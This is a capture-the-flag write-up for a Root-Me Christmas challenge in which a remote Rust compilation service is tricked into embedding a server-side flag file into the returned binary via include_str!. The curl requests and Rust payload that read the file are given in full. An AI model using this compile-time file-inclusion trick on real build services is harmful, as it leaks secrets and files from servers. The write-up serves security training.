# Day 04 - Build And Drustroy

I love rust because it's secure and fast. So I want people to do MOAR rust.

That's why I made a microservice to allow fast and easy remote code compilation.

Send my your code, I'll compile it, and I know for sure I'm safe!

```
curl -sSk -X POST -H 'Content-Type: application/json' https://day4.challenges.xmas.root-me.org/remote-build -d '{"src/main.rs":"fn main() { println!(\"Hello, world!\"); }"}' --output binary
file binary # binary: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, ...
```

>     Author : Laluka
>     https://day4.challenges.xmas.root-me.org/

## Analysis
We can run the challenge locally within a `docker`:

```console
$ sudo docker-compose up --build
(...)
Step 5/5 : CMD ["/app/target/release/build-and-drustroy"]
 ---> Using cache
 ---> 6ce0e68b404f
Successfully built 6ce0e68b404f
Successfully tagged day4_chall:latest
Starting day4_chall_1 ... done
Attaching to day4_chall_1
chall_1  | Server running on http://0.0.0.0:3000
```

Looking at the `docker-compose.yml` file, we see that the flag is in some text file under `/flag/`, but we don't know yet if the name of the file is the same on the target:
```
      - ./flag.txt:/flag/randomflaglolilolbigbisous.txt
```

Now, looking at the code (in `RUST`), we see that it indeed takes some code passed as data in the `POST request` to api `/remote-build`, compiles it and returns an `ELF file`.

So what we need to do is to send a piece of `RUST` code that:
- reads the file `/flag/randomflaglolilolbigbisous.txt`
- somehow makes a constant out of its contents, so that this constant is embedded within the compiled `ELF` itself
- print that content, so that we can run the received `ELF` binary and get the flag

## Solution
Here's the `RUST` code I used to read `/flag/randomflaglolilolbigbisous.txt`, put it into a constant and print it:

```rust
const FLAG: &'static str = include_str!("/flag/randomflaglolilolbigbisous.txt");

fn main() {
   println!("{}", FLAG);
}
```

We can make a oneliner out of it to make it easier to pass in the POST request:

```rust
const FLAG: &'static str = include_str!("/flag.txt"); fn main() { println!("{}", FLAG); }
```

I had some issue with the single quote before `static`, so I used `BURP` to do it, then copied the request back to a `curl command (bash)` from `BURP`. I gives a `curl` request where some fields are not necessary, but oh well, this works.

While still testing with the local instance on `127.0.0.1:3000`, we can indeed retrieve the local flag:

```console
$ curl -sSk -X $'POST' -H $'Host: 127.0.0.1:3000' -H $'User-Agent: curl/7.81.0' -H $'Accept: */*' -H $'Content-Type: application/json' -H $'Content-Length: 138' -H $'Connection: close' --data-binary $'{\"src/main.rs\":\"const FLAG: &\'static str = include_str!(\\\"/flag/randomflaglolilolbigbisous.txt\\\"); fn main() { println!(\\\"{}\\\", FLAG); }\"}' $'http://127.0.0.1:3000/remote-build' --output binary
$ file binary
binary: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=336e9753ab7a365fd1efd4e44717312f1c6d479f, for GNU/Linux 3.2.0, not stripped
$ chmod +x binary
$ ./binary
pouetpouet

```

Time to test it on the target, at `https://day4.challenges.xmas.root-me.org`. We don't know yet if the name of the file containing the flag is the same, but let's try it:

```console
$ curl -sSk -X $'POST' -H $'Host: day4.challenges.xmas.root-me.org' -H $'User-Agent: curl/7.81.0' -H $'Accept: */*' -H $'Content-Type: application/json' -H $'Content-Length: 138' -H $'Connection: close' --data-binary $'{\"src/main.rs\":\"const FLAG: &\'static str = include_str!(\\\"/flag/randomflaglolilolbigbisous.txt\\\"); fn main() { println!(\\\"{}\\\", FLAG); }\"}' $'https://day4.challenges.xmas.root-me.org/remote-build' --output binary2
$ file binary2
binary2: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2acd3e30cd8bb676cd9d9f057f4c4675e8e52b2f, for GNU/Linux 3.2.0, not stripped
$ chmod +x binary2
$ ./binary2
OffenSkillSaysHi2024RustAbuse

```

And it works !

## Flag
> OffenSkillSaysHi2024RustAbuse
